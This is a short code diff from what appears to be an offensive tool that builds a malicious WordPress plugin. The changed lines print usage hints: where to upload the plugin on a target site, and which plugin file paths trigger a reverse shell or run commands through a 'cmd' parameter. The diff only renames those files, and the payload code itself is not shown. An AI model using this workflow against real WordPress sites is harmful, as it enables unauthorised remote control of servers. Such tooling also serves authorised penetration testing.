@@ -228,9 +228,8 @@ def createplugin(args):
     # Useful Info
     print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
     print("[+] How to trigger the reverse shell : ")
-    print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
-    print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")
-    print("      ->   http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls")
+    print("      ->   http://(target)/wp-content/plugins/malicious/RemoteModule.php")
+    print("      ->   http://(target)/wp-content/plugins/malicious/WebModule.php?cmd=ls")
 
 
 
